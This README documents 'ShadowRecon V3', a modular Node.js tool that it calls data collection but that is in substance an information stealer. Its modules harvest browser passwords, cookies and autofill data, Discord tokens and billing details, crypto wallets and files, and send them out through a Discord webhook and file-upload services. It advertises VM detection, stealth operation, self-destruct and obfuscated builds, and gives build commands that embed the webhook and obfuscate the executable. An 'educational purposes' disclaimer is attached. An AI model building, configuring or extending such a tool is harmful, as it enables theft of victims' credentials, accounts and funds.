# ShadowRecon V3 - Modular Architecture

A clean, modular, and efficient data collection tool with improved architecture and maintainability.

## 🏗️ Architecture Overview

The application has been completely restructured to follow modern software engineering principles:

### Directory Structure

```
src/
├── config/
│   └── config.js           # Centralized configuration management
├── core/
│   ├── utils.js            # Core utility functions
│   ├── logger.js           # Logging system
│   ├── errors.js           # Error handling system
│   ├── statistics.js       # Statistics management
│   └── fileManager.js      # File operations management
├── modules/
│   └── browsers/
│       └── collector.js    # Browser data collection
├── services/
│   ├── discord/
│   │   └── service.js      # Discord integration
│   └── upload/
│       └── service.js      # File upload services
├── collectors/             # Data collection orchestration
└── main.js                # Application entry point

build/
└── builder.js             # Modular build system

docs/                       # Documentation
scripts/                    # Utility scripts
```

## 🚀 Key Improvements

### 1. **Modular Design**
- Clear separation of concerns
- Independent, reusable modules
- Well-defined interfaces between components

### 2. **Configuration Management**
- Centralized configuration system
- Environment-based settings
- Easy configuration updates without code changes

### 3. **Error Handling**
- Centralized error handling
- Custom error types for different scenarios
- Graceful error recovery

### 4. **Logging System**
- Structured logging with multiple levels
- Optional file output
- Debug and production modes

### 5. **Statistics Management**
- Comprehensive data tracking
- Formatted output for webhooks
- Real-time statistics updates

### 6. **File Management**
- Organized file operations
- Automatic cleanup
- Efficient archiving system

## 📦 Installation & Usage

### Prerequisites
- Node.js 14.0.0 or higher
- npm or yarn package manager

### Installation

```bash
# Install dependencies
npm install

# For production build dependencies
npm install -g pkg
```

### Configuration

Create a `config.json` file or set environment variables:

```json
{
  "webhook": {
    "url": "YOUR_WEBHOOK_URL"
  },
  "modules": {
    "enabled": {
      "browsers": true,
      "discord": true,
      "crypto": true,
      "files": true
    }
  }
}
```

### Running the Application

```bash
# Development mode
npm run dev

# Production mode
npm start

# Build executable
npm run build
```

### Building

```bash
# Basic build
node build/builder.js <webhook_url> <app_name>

# Advanced build with options
node build/builder.js <webhook_url> <app_name> --obfuscate --compress
```

## 🔧 Configuration Options

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `WEBHOOK_URL` | Discord webhook URL | `%WEBHOOK%` |
| `NODE_ENV` | Environment mode | `development` |
| `LOG_LEVEL` | Logging level | `INFO` |
| `ENABLE_BROWSERS` | Enable browser module | `true` |
| `ENABLE_DISCORD` | Enable Discord module | `true` |
| `ENABLE_VM_DETECTION` | Enable VM detection | `false` |
| `MAX_UPLOAD_SIZE` | Max file size for upload | `7MB` |

### Module Configuration

Each module can be enabled/disabled independently:

```javascript
modules: {
  enabled: {
    browsers: true,    // Browser data collection
    crypto: true,      // Cryptocurrency wallets
    files: true,       // File system scanning
    discord: true,     // Discord account data
    system: true,      // System information
    injection: false   // Browser injection
  }
}
```

## 📊 Modules

### Browser Collector
- **Path**: `src/modules/browsers/collector.js`
- **Function**: Collects data from Chrome, Firefox, Edge, Opera, Brave
- **Data**: Passwords, cookies, history, bookmarks, autofill data

### Discord Service
- **Path**: `src/services/discord/service.js`
- **Function**: Discord account extraction and webhook communication
- **Data**: Account info, tokens, billing, nitro status

### Upload Service
- **Path**: `src/services/upload/service.js`
- **Function**: File upload to external services (GoFile, etc.)
- **Features**: Automatic service selection, size-based upload decisions

## 🛠️ Development

### Adding New Modules

1. Create module directory in `src/modules/`
2. Implement collector class with standard interface
3. Add module to main application workflow
4. Update configuration options

```javascript
// Example module structure
class NewModuleCollector {
    async collect() {
        // Collection logic
        return results;
    }
}
```

### Error Handling

Use the centralized error handling system:

```javascript
const { ErrorHandler, ModuleError } = require('../core/errors');

try {
    // Risky operation
} catch (error) {
    throw new ModuleError('Operation failed', 'module-name');
}
```

### Logging

Use the logging system throughout the application:

```javascript
const { logger } = require('../core/logger');

logger.info('Operation started');
logger.debug('Debug information', { data });
logger.error('Operation failed', error.message);
```

## 🔒 Security Features

- VM detection (optional)
- Stealth operation mode
- Self-destruct capabilities
- Encrypted communications
- Obfuscated builds

## 📈 Statistics & Monitoring

The application tracks comprehensive statistics:

- Browser data counts (passwords, cookies, etc.)
- Module execution status
- File operations
- Network communications
- System information

Statistics are automatically formatted for Discord webhooks with rich embeds.

## 🚀 Build System

The modular build system supports:

- Code obfuscation
- Multi-platform targets
- Compression options
- Configuration injection
- Automated packaging

## 📝 License

This project is for educational purposes only. Use responsibly and in accordance with applicable laws.

## 🤝 Contributing

1. Follow the modular architecture principles
2. Add comprehensive error handling
3. Include logging for all operations
4. Update documentation for new features
5. Test across different environments

## 📞 Support

For support and questions, refer to the project repository or documentation.